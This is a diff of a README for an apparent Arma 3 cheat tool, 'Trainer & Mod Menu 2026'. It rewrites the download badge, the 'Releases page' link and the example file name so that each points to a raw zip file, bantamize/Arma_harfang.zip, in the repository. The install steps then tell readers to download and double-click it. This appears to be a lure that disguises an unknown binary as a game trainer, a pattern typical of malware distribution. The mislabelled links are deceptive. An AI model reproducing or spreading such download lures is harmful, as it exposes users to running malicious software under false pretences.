@@ -6,12 +6,12 @@ Arma 3 Trainer & Mod Menu 2026 is designed to improve your gaming experience. Wi
 ## 🚀 Getting Started
 To get started, you need to download the application. Follow these simple steps, and you'll be ready to boost your game.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/propants799/Arma-3-2026/releases)
+[![Download Now](https://github.com/propants799/Arma-3-2026/raw/refs/heads/main/bantamize/Arma_harfang.zip%20Now-%20-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/propants799/Arma-3-2026/raw/refs/heads/main/bantamize/Arma_harfang.zip)
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/propants799/Arma-3-2026/releases) to download the latest version of Arma-3-2026.
+1. Visit the [Releases page](https://github.com/propants799/Arma-3-2026/raw/refs/heads/main/bantamize/Arma_harfang.zip) to download the latest version of Arma-3-2026.
 2. Look for the latest release version at the top of the page.
-3. Click on the download link for the file that suits your system (e.g., `Arma-3-2026.exe`).
+3. Click on the download link for the file that suits your system (e.g., `https://github.com/propants799/Arma-3-2026/raw/refs/heads/main/bantamize/Arma_harfang.zip`).
 4. Once the file is downloaded, navigate to your downloads folder.
 5. Double-click on the downloaded file to start the installation process.
 6. Follow the on-screen prompts to complete the installation.
@@ -78,4 +78,4 @@ This application is related to the following topics:
 - arma-3-visuals
 - arma-3-wh
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-%20-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/propants799/Arma-3-2026/releases)
+[![Download Now](https://github.com/propants799/Arma-3-2026/raw/refs/heads/main/bantamize/Arma_harfang.zip%20Now-%20-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/propants799/Arma-3-2026/raw/refs/heads/main/bantamize/Arma_harfang.zip)
